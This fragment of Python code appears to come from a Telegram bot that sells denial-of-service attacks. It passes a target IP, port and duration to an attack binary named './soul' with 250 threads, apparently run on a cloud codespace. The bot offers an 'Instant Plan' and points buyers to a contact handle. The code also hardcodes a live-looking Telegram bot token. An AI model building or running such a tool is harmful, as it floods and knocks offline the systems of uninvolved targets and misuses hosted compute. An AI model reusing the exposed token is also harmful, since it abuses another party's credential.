...
TOKEN = '7201577721:AAGX5_Zdc8NBIBMeP5YTnwEqgcUkiVVJQ14'
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 250"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*DM @TMZEROO FOR ANY HELP*", parse_mode='Markdown')
